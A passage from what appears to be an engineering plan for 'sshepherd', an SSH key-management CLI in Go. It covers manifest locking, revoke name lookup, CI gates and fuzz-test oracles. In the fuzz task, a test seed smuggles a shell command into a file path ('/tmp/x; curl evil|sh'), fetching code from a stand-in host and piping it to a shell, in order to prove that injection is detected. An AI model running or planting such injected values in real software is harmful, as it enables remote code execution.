  `apply.Plural` is the existing helper at `internal/apply/report.go:27` (P07 keeps the name, W1 contract). The refusal comes **before** rendering, so nothing reaches stdout or `-o`, and it is a plain error, so exit 3 is `exitCodeFor`'s default (run.go:171). Change the adopt `Long` (adopt.go:239-245): "The input file is never modified" becomes "The input file is modified only when --output names it (with --force); it is then saved in place under the manifest lock, like revoke." Append an exit-code footer local to adopt.go (run.go is P13's):

```go
const exitCodesAdopt = `Exit codes:
  0  manifest produced
  1  some servers could not be read (nothing written without --partial)
  3  tool error, or --partial read no server at all`
```

  (Line 1 under D8 = option 1 becomes: `1  some servers could not be read (without --partial nothing is written; with it the partial manifest is written)`.)

- [ ] **Step 3b: Only if D8 = option 1** ("Exit 1 (like audit)"). After the successful write or stdout emit:

```go
if partial && read < total {
	return fmt.Errorf("%w: read %d of %d servers", errFleetUnreadable, read, total) // exit 1 after the output is written
}
```

  Set `const adoptPartialExit = 1` in adopt_test.go. If D8 is unanswered or option 2, leave this out and set `adoptPartialExit = 0`.

- [ ] **Step 4: Run, expect PASS, then regenerate the help golden:** `go test -race ./cmd/sshepherd/ -run 'Adopt'`, then `go test ./cmd/sshepherd/ -run TestHelpGolden -update` (P01 Task 4's test). Read `git diff cmd/sshepherd/testdata/help/adopt.golden` by eye: only the `Long` sentence and the footer may change.

---

#### Task 9 (COR-3): revoke resolves names against the manifest first (Stream B)

**Files:** `cmd/sshepherd/revoke.go`, `revoke_test.go`, `keyarg.go` (comment).

- [ ] **Step 1: Failing test** (revoke_test.go):

```go
// A real user name is always that user — even when it reads like an option
// word, a key-type prefix, a hex-colon pair or has a space.
func TestRevokeUserNamedLikeKey(t *testing.T) {
	t.Setenv("SSH_AUTH_SOCK", "")
	for _, name := range []string{"tunnel", "pty", "Alice Smith", "ssh-rsa-legacy", "ab:cd"} {
		t.Run(name, func(t *testing.T) {
			cfg := writeConfig(t, "users:\n  - {name: \""+name+"\", keys: ["+qk(t, 1)+"]}\n  - {name: bob, keys: ["+qk(t, 2)+"]}\n")
			var out, errBuf bytes.Buffer
			if code := run([]string{"revoke", name, "--config", cfg, "--no-apply", "--yes"}, &out, &errBuf); code != 0 {
				t.Fatalf("exit = %d, want 0\n%s", code, errBuf.String())
			}
			for _, u := range readCfg(t, cfg).Users {
				if u.Name == name {
					t.Errorf("user %q still in the manifest", name)
				}
			}
		})
	}
}
```

  `TestRevokeUsage`'s row `user that looks like a key` (revoke_test.go:653, a `SHA256:` fingerprint with no such user) must keep passing unchanged, and it does, because that name is unknown. Add a row `unknown option word`: `revoke tunnel` against `cfgBody`, which has no `tunnel` user, must still say `looks like a key — did you mean --key?`. Check after P06: if `--no-apply --yes` is rejected by P06's `checkModes`, use the combination P06 allows for a confirmed no-apply save.

- [ ] **Step 2: Run, expect FAIL:** `go test ./cmd/sshepherd/ -run 'TestRevokeUserNamedLikeKey|TestRevokeUsage'`. The new test exits 3 with `tunnel looks like a key — did you mean --key?`.

- [ ] **Step 3: Implement.** Delete the loop at revoke.go:84-88 from `revokeTargets` and update its doc. In RunE, right after `loadForEdit` succeeds and before planning:

```go
if err := checkUserArgs(mf.Config(), users); err != nil {
	return err
}
```

```go
// checkUserArgs: an argument naming a manifest user is that user, whatever
// it looks like (a service account called tunnel, "Alice Smith"). Only an
// unknown name that looks like a key is reported as a probable --key
// mistake; other unknown names reach planRevokeUsers' "unknown users" error.
func checkUserArgs(cfg *config.Config, users []string) error {
	for _, u := range users {
		known := slices.ContainsFunc(cfg.Users, func(x config.User) bool { return x.Name == u })
		if !known && looksLikeKey(u) {
			return fmt.Errorf("%s looks like a key — did you mean --key?", u)
		}
	}
	return nil
}
```

  This covers both `revoke USER…` and `revoke USER… --server`, since `users` feeds both. Update the `looksLikeKey` doc comment (keyarg.go:107-108): "…a revoke USER argument that does, **and names no manifest user**, is a usage error." The heuristic itself is unchanged, and P05 owns its option table.

- [ ] **Step 4: Run, expect PASS:** `go test -race ./cmd/sshepherd/ -run 'Revoke|Keyarg|LooksLike'`

---

#### Task 10: Integrator (one commit for the package, or one commit for wave 2 if the workflow batches)

- [ ] Apply the A, B and C diffs. Confirm that `cmd/sshepherd/edit_lock_unix.go` and `edit_lock_other.go` are deleted, and that `grep -rn 'userOut\|serverOut\|accessOut\|UserEntry\|ServerEntry\|AccessEntry\|writeFileNoClobber\|encodeManifest' --include='*.go' .` prints nothing.
- [ ] `make check` (fmt, goimports, vet, golangci-lint incl. wrapcheck/dupl/gosec, deadcode, gitleaks, tests with `-race`, coverage gate). Then `make integration`. P12 adds no integration-tagged test, but the dockerized suite runs as root, so it exercises the new lock owner check on real revoke/rotate E2E flows.
- [ ] **README.md deltas** (prose and tables only, with no new sample output. If a sample is added, copy it from a real run of the built binary):
  1. **Output files** (README.md:509-515): "New files are written mode `0600` … When `-o` names the manifest the run read (`adopt --config`, `adopt --merge`, `import --merge FILE`, symlinks followed), `--force` updates it **in place** exactly as `revoke` saves: under the manifest lock, refused with `manifest PATH changed since it was read; re-run` if anything changed it meanwhile, keeping the file's mode and owner. Identical output writes nothing. A hard link to the manifest under another name is refused."
  2. **adopt intro** (README.md:521-522): "The input file is never modified" becomes "never modified unless `-o` names it (see Output files)". Also add a `--partial` paragraph after README.md:538: the `read X of N servers` line, and `read 0 of N servers — nothing could be adopted` (exit 3).
  3. **Safety model → Manifest edits** (README.md:1376-1384): add the lock-file rule. `.NAME.sshepherd-lock` must be a regular file owned by you or by the manifest's owner. A symlink, FIFO or foreign-owned file is refused (`… — remove it and re-run`) and never followed. A save also keeps the manifest's group when the directory would hand new files another group.
  4. **Exit codes** (README.md:1340-1350): change the intro to "shared by `audit`, `apply`, `revoke` and `rotate`; `adopt` and `import` below". Add a small table: adopt `0` manifest produced / `1` servers unreadable (strict: nothing written; with `--partial` under D8 = option 1: written) / `3` tool error incl. `--partial` with zero servers read, an in-place save refused (changed since read, lock held); import `0` / `3`. Copy the `exitCodesAdopt` footer verbatim from `testdata/help/adopt.golden`.
  5. **revoke** section: "`revoke NAME` looks NAME up in the manifest first, so users called `tunnel` or `Alice Smith` are revoked by name. Only an unknown name that looks like a key or fingerprint gets `NAME looks like a key — did you mean --key?`."
  6. The flag tables are unchanged, because no flag text changed. Confirm with the help-sync test.
- [ ] **Spec amendments** (one dated line each, "Amended 2026-11 (P12)"):
  - `2026-10-23-revoke-rotate-design.md:115-124`: the looks-like-a-key check moved after the manifest read and applies only to unknown names.
  - `2026-07-16-adopt-merge-design.md` and `2026-07-19-import-merge-design.md`: in-place `-o FILE --force` saves through `manifest.Store`.
- [ ] **CLAUDE.md Status:** add one sentence: "Every manifest write goes through `internal/manifest`'s store (`Store.Save` for revoke/rotate and in-place `adopt`/`import -o FILE --force`: lock with a no-follow, owner-checked sidecar, changed-since-read refusal, mode and owner kept; `WriteFile` for new files); fresh and merged manifests share one encoder from the config types, guarded by a reflection round-trip test; `revoke NAME` resolves manifest users first; `adopt --partial` refuses a zero-read fleet (exit 3) and reports `read X of N`."
- [ ] Hand off to the independent verifier. It checks: the concurrent-revoke tests fail when `publishManifest`'s Save branch is replaced with `manifest.WriteFile(..., true)`, the round-trip test fails when one field is dropped from `entryNode` (e.g. skip `authorized_keys_file`), the lock tests fail when `O_NOFOLLOW` is removed, the goldens are byte-identical to HEAD, and the README tables match `--help`.

---

#### Risks and how they are verified

| Risk | Mitigation / verification |
|---|---|
| The store move silently changes revoke/rotate/apply error text or seam timing | Error strings are moved verbatim, and the adapter keeps `beforeManifestSave` firing at the same point (after the Stream check). The whole existing cmd suite (`TestRevokeCASConflict`, `TestRevoke*Interrupted*`, `json_cmd_test.go:401`, `edit_stream_test.go`) runs unmodified in Task 5 Step 4. |
| The generic encoder changes golden bytes (quoting, `[]`, field order) | Task 7 Step 4 requires byte-identical goldens without `-update`. `TestGenerateOmitEmpty` and `TestGenerateEmptySections` pin the exact text. |
| The reflection encoder emits a future field that *should* be omitted at a non-zero default | Every non-required field is omitempty. The round-trip test proves a field survives, and a new field needs a sample, which forces a reviewer to look. |
| The lock owner check refuses a legitimate run | A refusal happens only for a lock owned by neither euid nor the manifest's owner. Today such a lock already fails with EACCES (mode 0600) for any non-root user, so only root runs are newly stopped, and those are the SEC-7 attack case. The message says to remove the file. |
| `keepOwner` now chowns in more cases | It only chowns back to the manifest's own group when the directory's inheritance would change it. A process can always chown to a group it belongs to, and before this fix that case silently changed the gid. Covered by Task 3 (b). |
| An in-place adopt regenerate still loses a revoke that lands *after* Save's CAS | No: Save holds the flock across CAS + rename, and revoke takes the same lock (`TestStoreSaveRace`). |
| `TestAdoptPartialSomeRead` is flaky on a closed port | It uses the existing `closedPort` + hermetic `editFleet` pattern that the strict-gate test already relies on. |
| Supplementary-group tests skip on some runners | They skip loudly. GitHub `ubuntu-latest` and macOS dev users have supplementary groups, and the integrator records whether they ran. |
| Windows/other OS build | `store_other.go` keeps the refusal. Run `GOOS=windows go vet ./internal/manifest/ ./cmd/sshepherd/` in Task 1 Step 4 and before the commit. |

#### Acceptance

```sh
go test -race ./internal/manifest/ ./cmd/sshepherd/
go test ./cmd/sshepherd/ -run 'Golden'                 # no -update: adopt_*/import_* byte-identical
go test -run XXX -fuzz '^FuzzMergeRoundTrip$' -fuzztime 30s ./internal/manifest/
go test -run XXX -fuzz '^FuzzManifestEdit$' -fuzztime 30s ./internal/manifest/
GOOS=windows go vet ./internal/manifest/ ./cmd/sshepherd/
grep -rn 'userOut\|serverOut\|accessOut\|UserEntry\|ServerEntry\|AccessEntry\|writeFileNoClobber\|lockManifest' --include='*.go' . ; test $? -eq 1
make check
make integration
```

Manual smoke (scratch dir, built binary): `chmod 640 m.yaml; sshepherd import cfg --merge m.yaml --servers-only -o m.yaml --force` leaves mode `0640` and creates `.m.yaml.sshepherd-lock`. `ln -s /tmp/x .m.yaml.sshepherd-lock` followed by a revoke refuses with `is a symlink`. `sshepherd revoke tunnel --no-apply --yes` succeeds for a user named `tunnel`. `adopt --partial` against all-closed ports exits 3 with `read 0 of N servers — nothing could be adopted`.

#### Out of scope

- The on-hold items: `prune`, `apply --force`, `import --prefer`, key generation/scheduled rotation, move-key, apply wipe/empty-server mode. None overlap these findings. The in-place `--force` here is the existing `adopt/import -o` overwrite flag, not `apply --force`.
- D5 (adopt wildcard for unknown keys): `nu.Wildcard → ["*"]` is carried over unchanged.
- D1/D4 (revoke tombstones, manifest serial): the store is the natural home for them later. P04 specs them.
- Renaming `--merge`/`--operator` flags (D26), and adopt's ignored-line `unreadable` header wording (P05 follow-up).
- Keeping mode/owner when `--force` overwrites a *different* existing file. It stays 0600 as documented, because that is a new-file publish.
- Strict-mode (no `--partial`) adopt exit codes, which stay 1. Any change to `run.go` (P13).
- An E2E step for in-place merge: `e2e_test.go` belongs to P13 in wave 2. Coverage here is hermetic, and it can be added in a later wave.

---

### P13 — CI and quality-gate hygiene: lint/vet integration files, full fuzz with kept corpus, licenses and history scan, versioned binaries, Dependabot-visible pins, multi-distro fleet matrix

> **Program notes (master plan, revised by the review panel):** **Task 1 (OPS-7) runs early, in W0, as its own lane P13-0** (owning `.golangci.yml`, the Makefile `vet`/`gosec` lines and `cmd/sshepherd/identity_integration_test.go`), so every later agent's `make check` type-checks the integration and E2E files that W0–W2 rename around. Ownership amended: also `scripts/docker-gates.sh` (lane C). Lane B's Tasks 4 and 6 (all targets) and lane D (Tasks 10–11 and Task 12 Step 4, plus the integration matrix in `ci.yml`/`release.yml`) run in W2 round 2, after P11 is committed. D7 gates Task 9. Commits are **one per lane** (A → B → C → D), not one for the package.

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this package task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Kind:** fix · **Wave:** 2 · **depends_on:** P02 (rewrites `ci.yml`, `release.yml`, `dependabot.yml`, `scripts/docker-gates.sh`), P03 (adds fixtures and the shuffled run to `scripts/integration.sh`)

**Goal:** Every gate that CLAUDE.md describes actually runs. The integration-tagged test files are vetted, linted and gosec-scanned. `make fuzz` finds every `Fuzz*` target by itself, FuzzRemote and FuzzWriteCmds have oracles that can catch the bug they exist for, and the daily job fuzzes for minutes and keeps its corpus. `make check` checks licenses and workflow syntax, and CI scans the pushed history for secrets. The smoke test runs the image hardened. `make build` and `go install` binaries report a real version, and (if D7 is yes) releases ship signed binaries. Scanner and test-image pins are in Dockerfiles that Dependabot reads. Integration and E2E run on alpine, debian and rocky, with two separate sshd containers.

**Architecture:** No product logic changes. The only Go product change is `resolveVersion` in `cmd/sshepherd` (an `ldflags` value, else `debug.ReadBuildInfo().Main.Version`). The rest is the Makefile, `.golangci.yml`, workflows, `ci/images/*.Dockerfile` (FROM-only pin files and three sshd test images), test oracles, new corpus directories, and `scripts/integration.sh`, which now takes a distro, builds `ci/images/sshd-<distro>.Dockerfile`, and starts two containers on dynamic ports.

**Tech Stack:** GNU make, GitHub Actions (SHA-pinned), Go 1.27.3 native fuzzing, golangci-lint v2.15.0, gosec v2.29.0, gitleaks v8.30.1 (`gitleaks git`), go-licenses v2.0.1 (new), actionlint v1.7.12 (new, as in P02), benchstat `golang.org/x/perf/cmd/benchstat@v0.0.0-20261009192801-be2c69fb417e` (new, CI only), cosign `sign-blob` (D7), Docker (alpine 3.24.2, debian 13 slim, rocky 10.1).

#### Findings covered

| ID | Sev | One line |
|---|---|---|
| OPS-5 | LOW | `TRIVY_IMAGE`/`DOCKLE_IMAGE` (`ci.yml:59-60`, top-level `env:` in P02's release.yml) and the alpine digest in `scripts/integration.sh:39` are plain strings that Dependabot cannot see, yet `ci.yml:16-17` says "Dependabot bumps both". |
| OPS-7 | LOW | The 4 `//go:build integration` files are never vetted, linted or gosec-scanned (`Makefile:57,61,83`, no `build-tags` in `.golangci.yml`). Lint with the tag finds `identity_integration_test.go:158:8` ineffassign (reproduced at HEAD). |
| OPS-8 | LOW | `make fuzz` hand-lists 16 of 17 targets (`Makefile:111-127`, FuzzRemote missing). 15s per target, no corpus kept between days. README:1491 says "every fuzz target daily". |
| OPS-9 | LOW | `go-licenses` is not run anywhere. Secrets are scanned only in the working tree (`Makefile:89`). The read-only-rootfs claim is never exercised. Benchmarks never run in CI. |
| OPS-10 | LOW | `var version = "dev"` (`run.go:23`) is set only by the Dockerfile. `make build` (`Makefile:49`) and `go install …@vX` print `dev`. Releases have no signed binaries (D7). |
| TST-5 | LOW | All integration/E2E servers are users on one alpine sshd (`integration.sh:33-99`): busybox only, one `AuthorizedKeysFile`, no multi-host fan-out, no per-host known_hosts. |
| TST-6 | LOW | FuzzRemote's only property is idempotence (`sanitize_test.go:25-33`). FuzzWriteCmds' `sh -n` oracle (`sshwrite/fuzz_test.go:41`) cannot fail on an injection. 3 of 17 targets have a committed corpus. |

**On-hold overlap:** none. Release binaries (D7) are a packaging change, not key generation or scheduled rotation. No task changes product behavior or the manifest schema, so **no design spec is needed**. The only owner decision is **D7** (Task 9 runs only if D7 = option 1). If D7 = option 2 (goreleaser), Task 9 must be re-planned. If D7 = option 3, skip Task 9. The version fix (Task 8) lands in every case.

#### Files owned

| Lane | Files |
|---|---|
| P13-0 (W0) | Task 1 only: `.golangci.yml`, `Makefile` (`vet` and `gosec` recipes only), `cmd/sshepherd/identity_integration_test.go` |
| A (gates, W2 round 1) | `Makefile`, `cmd/sshepherd/run.go` (one line), `cmd/sshepherd/version.go` (new, tiny), `cmd/sshepherd/version_test.go` (new) |
| B (fuzz) | `internal/sanitize/sanitize_test.go`, `internal/sshwrite/fuzz_test.go`, new corpus dirs only: `internal/{adopt,authkeys,clog,config,identity,keyfile,sanitize,sshcfg,sshconn,sshwrite}/testdata/fuzz/<Target>/`. Never `cmd/sshepherd/testdata/fuzz/` and never the two existing `internal/manifest/testdata/fuzz/*` dirs. |
| C (workflows, pins; round 1) | `.github/workflows/ci.yml`, `.github/workflows/release.yml`, `.github/dependabot.yml`, `ci/images/trivy.Dockerfile` (new), `ci/images/dockle.Dockerfile` (new), **`scripts/docker-gates.sh` (not in the package's file list: added here for the OPS-9 hardened smoke; P02 owned it in Wave 0 and nothing else in Wave 2 touches it)** |
| D (fleet; round 2) | `scripts/integration.sh`, `ci/images/sshd-alpine.Dockerfile`, `ci/images/sshd-debian.Dockerfile`, `ci/images/sshd-rocky.Dockerfile` (new), `cmd/sshepherd/e2e_test.go`, and in round 2 only `.github/workflows/ci.yml` + `release.yml` for the integration matrix (Task 12 Step 4; lane C has no round-2 work) |
| Integrator | `README.md` (Install ~:68-77, dev section ~:1462-1505), `CLAUDE.md` (quality gates ~:112-160, Testing, Status) |

`cmd/sshepherd/run_test.go` is in the package list but is **not changed**. The version tests go in the new `version_test.go`. `version.go` (new) holds `resolveVersion` so that run.go, which P01 and P06 also edit, changes by one line only.

#### Grounding (current code, verified at HEAD)

- `Makefile:45` `check: tidy fmt vet lint deadcode security coverage`. `:49` build has no `-X`. `:57` `go vet ./...`. `:83` `gosec -quiet ./...`. `:89` `gitleaks dir --redact .`. `:111-127` 16 hand-written fuzz lines with unanchored `-fuzz=` regexes. `:3` `VERSION ?= $(shell git describe --tags --always --dirty …)` is used only by `docker`. `:2` `IMAGE := sshepherd:dev` is already taken, so the distro switch is called **`IT_DISTRO`**, not `IMAGE`.
- Discovery check run at HEAD: `go list` plus `go test -list '^Fuzz'` over `./...` gives **exactly 17** `pkg Target` pairs, including `internal/sanitize FuzzRemote`.
- `GOTOOLCHAIN=go1.27.3 golangci-lint run --build-tags=integration ./...` gives exactly 1 issue (the ineffassign at `identity_integration_test.go:158`). `go vet -tags=integration ./...` and `gosec -quiet -tags=integration ./...` are clean.
- `go run github.com/google/go-licenses/v2@v2.0.1 check --disallowed_types=forbidden,restricted,unknown ./cmd/sshepherd` exits 0. The report lists cobra (Apache-2.0), pflag/x-crypto/x-sys/x-term (BSD-3-Clause) and yaml.v3 (MIT). It prints harmless "contains non-Go code" warnings on stderr.
- `sshwrite.go:194-251`: every builder (`writeCmdFor`, `restoreCmdFor`, `disableKeys2Cmd`, `restoreKeys2Cmd`) starts with `sshconn.PathAssign(path)` (`sshconn.go:65-70`), and the path enters nowhere else. That is the invariant Task 4's oracle checks.
- `sanitize.Remote` is a `strings.Map` (`sanitize.go:18-25`), so invalid UTF-8 comes out as U+FFFD, which is valid. clog's FuzzSanitize (`clog/fuzz_test.go:19-32`) is the model oracle.
- `.gitleaks.toml` allowlists `^internal/keyfile/testdata/`, so keyfile corpus entries may hold key-like bytes. Any other new corpus dir must pass `gitleaks dir`.
- Pins resolved 2026-11-07: `actions/cache` v6.1.0 = `55cc8345863c7cc4c66a329aec7e433d2d1c52a9`. `actions/download-artifact` v8.0.2 = `9000827ccba6bdab643e8b6fd33ac0654aef8333`, released the same day as the repo's `upload-artifact` v7.0.2. `alpine:3.24.2@sha256:294b683c…77e6` (the current pin). `debian:13.3-slim@sha256:1d3c811171a08a5adaa4a163fbafd96b61b87aa871bbc7aa15431ac275d3d430`. `rockylinux/rockylinux:10.1@sha256:f4da504c18e7aced902f4f728cde787cd9d9b817bc639fe171026d18364dca6c`. Agents re-resolve with `docker buildx imagetools inspect <ref> --format '{{json .Manifest.Digest}}'` and use the newest patch tag that is at least 7 days old (P02's cooldown).
- Audit exits 2 on `error_kind: host_key_changed` (`internal/audit/errors.go:24,83`).
- After P02, release.yml has the jobs `verify-ref → check ∥ integration ∥ image → gate → publish`, a top-level `env:` with `TRIVY_IMAGE`/`DOCKLE_IMAGE`, and only `publish` holds `id-token: write`. ci.yml uses `go-version-file: go.mod`, `docker` is an amd64/arm64 matrix, and `scheduled` also Trivy-scans the published image. After P03, `integration.sh` ends with an exported `SSHEPHERD_IT_*` block, a shuffled `-count=2` sshwrite run and a separate sshread + cmd/sshepherd run. It also adds a root login (`rootvictim`), `PermitRootLogin prohibit-password`, and `chown nobody:nobody` for `fanc`. **`nobody:nobody` fails on Debian, where the group is `nogroup`**, and Task 10 fixes that.

#### Execution model (parallel, disjoint files)

| Owner | Tasks | Starts |
|---|---|---|
| Agent P13-0 (worktree) | 1 | **W0** |
| Agent A (worktree) | 2, 5, 8 (and Task 12 Step 3's `BENCHSTAT_VERSION` line) | W2 round 1, in parallel with P11/P12 |
| Agent B (worktree) | 3 (round 1); 4, 6 (round 2) | Task 3 at once. **Tasks 4 and 6 run in round 2**, after P11's `sshwrite.go` and lane A's `make fuzz-list` are committed. |
| Agent C (worktree) | 7, 9 (if D7), 12 Steps 1–3 | W2 round 1. Codes against the contracts below. |
| Agent D (worktree) | 10, 11, 12 Step 4 | **W2 round 2**, after P11 is committed (P11 changes the sshwrite/sshread integration tests that the matrix runs on 3 distros) |
| Integrator | 13 | applies A → B → C (round 1) and B → D (round 2) on top of P11/P12, runs Acceptance, updates README/CLAUDE.md, **one commit per lane** |
| Verifier | 14 | read-only, independent |

**Contracts fixed up front:**
- `make integration [IT_DISTRO=alpine|debian|rocky]` runs `./scripts/integration.sh "$(IT_DISTRO)"`. The default is `alpine`.
- `make fuzz [FUZZTIME=15s]` fuzzes every discovered target. `make fuzz-list` prints `importpath Target` lines.
- `make secrets-history BASE=<sha>` scans `BASE..HEAD`, or the whole history when BASE is empty, all zeros or unknown.
- `make dist GOOS=… GOARCH=… VERSION=…` writes `dist/sshepherd_$(VERSION)_$(GOOS)_$(GOARCH)`.
- `ci/images/<name>.Dockerfile` holds the pin on its first `FROM` line. Workflows read it with `sed -n 's/^FROM[[:space:]]\{1,\}\([^[:space:]]\{1,\}\).*/\1/p' | head -n1`.

Rules: agents never commit. Use `GOTOOLCHAIN=go1.27.3`. Use `rtk proxy <cmd>` when exact lines matter. Integration runs use dynamic ports and unique container names after Task 10. Before Task 10 lands, only one `make integration` may run per machine (fixed name `sshepherd-it`).

---

#### Task 1 (P13-0, runs in W0): Lint, vet and gosec the integration-tagged files (OPS-7)

**Files:** `.golangci.yml`, `Makefile` (`vet`, `gosec`), `cmd/sshepherd/identity_integration_test.go:158`.

- [ ] **Step 1: Failing gate.** Add the following to `.golangci.yml` after `version: "2"`:
```yaml
run:
  # Lint the //go:build integration files too (real-sshd and E2E tests);
  # they compile without sshd, so the gate costs nothing extra.
  build-tags:
    - integration
```
- [ ] **Step 2: Run, expect FAIL:** `rtk proxy make lint` prints `cmd/sshepherd/identity_integration_test.go:158:8: ineffectual assignment to out (ineffassign)`.
- [ ] **Step 3: Fix** by using `out` in the failure message, which also adds the missing diagnostic:
```go
	code, out, stderr := runHeadless(t, bin, append([]string{"adopt", "--config", m0, "--known-hosts", kh, "-o", adopted}, id...)...)
	if code != 0 {
		t.Fatalf("headless adopt exit = %d (stderr: %s)\n%s", code, stderr, out)
	}
```
- [ ] **Step 4: Makefile.**
```make
## vet: go vet, plain and with the integration build tag
vet:
	$(GO) vet $(PKG)
	$(GO) vet -tags=integration $(PKG)
...
gosec:
	gosec -quiet -tags=integration ./...
```
- [ ] **Step 5: Run, expect PASS:** `make vet lint gosec`. Mutation proof in a scratch copy: put `_ = 1; x := 1; x = 2` into `internal/sshread/integration_test.go`, and `make lint` must fail on it.

#### Task 2 (A): `make fuzz` discovers its targets (OPS-8, TST-6)

**Files:** `Makefile`.

- [ ] **Step 1: Failing check:** `make fuzz-list | grep -c .` fails (no such target). `grep -c 'fuzz=FuzzRemote' Makefile` prints `0`.
- [ ] **Step 2: Implement.** Replace `Makefile:110-127`:
```make
FUZZTIME ?= 15s

## fuzz-list: every Fuzz* target as "importpath Target" (discovered, never hand-listed)
fuzz-list:
	@for pkg in $$($(GO) list -f '{{if or .TestGoFiles .XTestGoFiles}}{{.ImportPath}}{{end}}' $(PKG)); do \
	  $(GO) test -list '^Fuzz' $$pkg | sed -n "s|^\(Fuzz[A-Za-z0-9_]*\)$$|$$pkg \1|p"; \
	done

## fuzz: fuzz every target for FUZZTIME each (default 15s); runs all, fails if any failed
fuzz:
	@fail=0; $(MAKE) -s fuzz-list > .fuzz-targets || exit 1; \
	while read -r pkg t; do \
	  echo "== $$t ($$pkg)"; \
	  $(GO) test -run='^$$' -fuzz="^$$t\$$" -fuzztime=$(FUZZTIME) $$pkg || fail=1; \
	done < .fuzz-targets; rm -f .fuzz-targets; exit $$fail
```
Anchoring `^…$` matters: an unanchored `-fuzz=FuzzParse` matches FuzzParseLine/FuzzParseFile in authkeys and `go test` refuses multiple matches. Add `fuzz-list` to `.PHONY` and `.fuzz-targets` to `clean`. Do not add it to `.gitignore`, which Lane A does not own. The file is removed on every run.
- [ ] **Step 3: Run, expect PASS:** `test "$(make -s fuzz-list | wc -l)" -eq "$(grep -rh '^func Fuzz' --include='*_test.go' . | wc -l)"` (the count grows as W1/W2 add targets such as `FuzzCheckOption`, so no literal), and `make fuzz-list | grep -x '.*/internal/sanitize FuzzRemote'` matches. `make fuzz FUZZTIME=2s 2>&1 | grep -c '^== '` equals the same `grep -rh '^func Fuzz'` count, and the run exits 0. Negative check: in a scratch copy, add `func FuzzZZ(f *testing.F){f.Fuzz(func(t *testing.T,b []byte){t.Fatal("x")})}` to `internal/adopt`, and `make fuzz FUZZTIME=1s` must run every target and exit non-zero.

#### Task 3 (B): FuzzRemote gets the safety property (TST-6)

**Files:** `internal/sanitize/sanitize_test.go`. P11 owns `sanitize.go` and `truncate_test.go` in this wave, so do not touch them.

- [ ] **Step 1: Write the stronger oracle:**
```go
func FuzzRemote(f *testing.F) {
	f.Add("a\x1b\u009b‮b")
	f.Add("plain\n\ttext")
	f.Add("bom﻿ zwj‍ lre‪")
	f.Add("bad utf8 \xff\xfe")
	f.Fuzz(func(t *testing.T, s string) {
		out := Remote(s)
		for _, r := range out {
			if r == '\n' || r == '\t' {
				continue
			}
			if unicode.IsControl(r) || unicode.Is(unicode.Cf, r) {
				t.Fatalf("hostile rune %U survived: %q -> %q", r, s, out)
			}
		}
		if !utf8.ValidString(out) {
			t.Fatalf("invalid UTF-8 survived: %q -> %q", s, out)
		}
		if Remote(out) != out {
			t.Fatalf("not idempotent: %q -> %q", s, out)
		}
	})
}
```
(imports `unicode`, `unicode/utf8`).
- [ ] **Step 2: Prove it can fail.** In a scratch copy, drop `|| unicode.Is(unicode.Cf, r)` from `sanitize.go:20`, then run `go test -run '^FuzzRemote$' ./internal/sanitize/`. It must FAIL on the first seed (`U+202E survived`). The old idempotence-only oracle passes on the same mutant. TestRemote also fails, as the verifier noted. That is fine: the fuzz property must hold on its own.
- [ ] **Step 3: Run, expect PASS:** `go test -race ./internal/sanitize/ && go test -run '^$' -fuzz '^FuzzRemote$' -fuzztime 60s ./internal/sanitize/`. If P11 adds truncation to `Remote`, the property still holds as long as P11's truncation marker is printable text. The integrator re-runs this after applying P11.

#### Task 4 (B, after P11's sshwrite.go): FuzzWriteCmds with an oracle that can fail (TST-6)

**Files:** `internal/sshwrite/fuzz_test.go`.

Decision: **keep it and make the oracle real, without running the write script.** Running `mkdir`/`mv`/`rm` at fuzz-chosen paths is not sandbox-safe (`fuzz_test.go:15-17`), so the test instead checks the two facts that together make injection impossible. (1) Template invariance: the path enters each script only through one leading `sshconn.PathAssign(path)`, and the rest of the script is byte-identical to the script for a fixed reference path. (2) Printf oracle under a sandboxed `HOME`: run only `PathAssign(path) + "; printf %s \"$p\""` with `HOME=/h`, an empty env and nothing else. It must print exactly the expected expansion. FuzzShQuote still guards ShQuote itself.

- [ ] **Step 1: Replace the fuzz body** (seeds unchanged):
```go
	builders := map[string]func(string) string{
		"write absent":   func(p string) string { return writeCmdFor(p, Snapshot{Absent: true}, 42) },
		"write present":  func(p string) string { return writeCmdFor(p, SnapshotOf(false, []byte("x\n")), 42) },
		"restore":        func(p string) string { return restoreCmdFor(p, false, SnapshotOf(false, []byte("x\n"))) },
		"restore absent": func(p string) string { return restoreCmdFor(p, true, SnapshotOf(false, []byte("x\n"))) },
	}
	const ref = "/ref/authorized_keys"
	f.Fuzz(func(t *testing.T, path string) {
		if strings.ContainsRune(path, 0) {
			t.Skip("NUL cannot survive execve; config validation rejects control characters")
		}
		for name, build := range builders {
			got, want := build(path), build(ref)
			rest, ok := strings.CutPrefix(got, sshconn.PathAssign(path))
			if !ok {
				t.Fatalf("%s: script does not start with PathAssign(%q):\n%s", name, path, got)
			}
			if wantRest := strings.TrimPrefix(want, sshconn.PathAssign(ref)); rest != wantRest {
				t.Fatalf("%s: path %q changed the script outside its PathAssign token:\n got %s\nwant %s", name, path, rest, wantRest)
			}
		}
		expect := path
		if r, ok := strings.CutPrefix(path, "~/"); ok {
			expect = "/h/" + r
		}
		c := exec.CommandContext(t.Context(), "sh", "-c", sshconn.PathAssign(path)+`; printf %s "$p"`)
		c.Env = []string{"HOME=/h"}
		out, err := c.Output()
		if err != nil || string(out) != expect {
			t.Fatalf("PathAssign(%q) evaluates to %q (err %v), want %q", path, out, err, expect)
		}
	})
```
Update the doc comment to describe the two properties. If P11 changed builder signatures, adapt the four closures and nothing else. If P11 added a builder that takes a path, add it to `builders`.
- [ ] **Step 2: Prove it can fail** (scratch copy): append `+ "; d=" + path` to the end of `writeCmdFor`. `go test -run '^FuzzWriteCmds$' ./internal/sshwrite/` must FAIL on seed `/tmp/x; curl evil|sh`. The old `sh -n` oracle passes this mutant, because `d=/tmp/x; curl evil|sh` parses.
- [ ] **Step 3: Run, expect PASS:** `go test -race ./internal/sshwrite/ -run FuzzWriteCmds && go test -run '^$' -fuzz '^FuzzWriteCmds$' -fuzztime 60s ./internal/sshwrite/`.

#### Task 5 (A): License gate, history secret scan, actionlint (OPS-9)

**Files:** `Makefile`.

